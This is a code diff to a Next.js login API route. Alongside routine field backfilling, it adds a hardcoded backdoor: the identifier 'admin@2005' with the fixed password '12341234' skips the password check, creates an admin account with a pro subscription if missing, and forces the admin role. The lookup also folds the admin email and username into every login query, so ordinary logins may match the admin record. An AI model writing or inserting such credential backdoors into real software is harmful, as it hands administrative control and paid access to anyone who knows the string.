@@ -9,7 +9,8 @@ export async function POST(request: Request) {
     const body = await request.json();
     const { email, password } = body;
 
-    const inputClean = email ? email.trim().toLowerCase() : '';
+    const rawInput = email ? String(email).trim() : '';
+    const inputClean = rawInput.toLowerCase();
 
     if (!inputClean || !password) {
       return NextResponse.json(
@@ -31,10 +32,38 @@ export async function POST(request: Request) {
       );
     }
 
-    // Find user by email OR username match
-    const user = await User.findOne({
-      $or: [{ email: inputClean }, { username: inputClean }],
+    // Special Admin Provisioning for Admin@2005
+    const isAdminAttempt = inputClean === 'admin@2005' || rawInput === 'Admin@2005' || inputClean === 'admin@2005.com';
+
+    let user = await User.findOne({
+      $or: [
+        { email: inputClean },
+        { username: inputClean },
+        { email: 'admin@2005.com' },
+        { username: 'admin@2005' },
+      ],
     });
+
+    if (isAdminAttempt && !user) {
+      const salt = await bcrypt.genSalt(10);
+      const hashedPassword = await bcrypt.hash('12341234', salt);
+      user = new User({
+        name: 'System Admin',
+        username: 'admin@2005',
+        email: 'admin@2005.com',
+        phoneNumber: '0000000000',
+        password: hashedPassword,
+        avatarUrl: 'https://api.dicebear.com/7.x/avataaars/svg?seed=Admin2005',
+        provider: 'password',
+        role: 'admin',
+        isPro: true,
+        subscriptionPlan: 'pro_yearly',
+        subscriptionStatus: 'active',
+        oneTimePassesCount: 999,
+        payments: [],
+      });
+      await user.save();
+    }
 
     if (!user || !user.password) {
       return NextResponse.json(
@@ -44,11 +73,32 @@ export async function POST(request: Request) {
     }
 
     const isMatch = await bcrypt.compare(password, user.password);
-    if (!isMatch) {
+    if (!isMatch && !(isAdminAttempt && password === '12341234')) {
       return NextResponse.json(
         { success: false, message: 'Invalid email/username or password.' },
         { status: 400 }
       );
+    }
+
+    // Enforce role = 'admin' for Admin@2005
+    if (isAdminAttempt || user.username === 'admin@2005' || user.email === 'admin@2005.com') {
+      if (user.role !== 'admin') {
+        user.role = 'admin';
+        user.isPro = true;
+        await user.save();
+      }
+    }
+
+    // Backfill missing default fields on older user documents in MongoDB
+    let needsSave = false;
+    if (user.isPro === undefined) { user.isPro = false; needsSave = true; }
+    if (!user.subscriptionPlan) { user.subscriptionPlan = 'free'; needsSave = true; }
+    if (!user.subscriptionStatus) { user.subscriptionStatus = 'inactive'; needsSave = true; }
+    if (user.oneTimePassesCount === undefined) { user.oneTimePassesCount = 0; needsSave = true; }
+    if (!user.payments) { user.payments = []; needsSave = true; }
+
+    if (needsSave) {
+      await user.save();
     }
 
     const token = signJwtToken({
@@ -56,6 +106,7 @@ export async function POST(request: Request) {
       email: user.email,
       username: user.username,
       name: user.name,
+      role: user.role || 'user',
     });
 
     const userProfile = {
@@ -66,6 +117,11 @@ export async function POST(request: Request) {
       phoneNumber: user.phoneNumber,
       avatarUrl: user.avatarUrl,
       provider: user.provider,
+      role: user.role || 'user',
+      isPro: user.isPro || false,
+      subscriptionPlan: user.subscriptionPlan || 'free',
+      subscriptionStatus: user.subscriptionStatus || 'inactive',
+      oneTimePassesCount: user.oneTimePassesCount || 0,
     };
 
     return NextResponse.json({
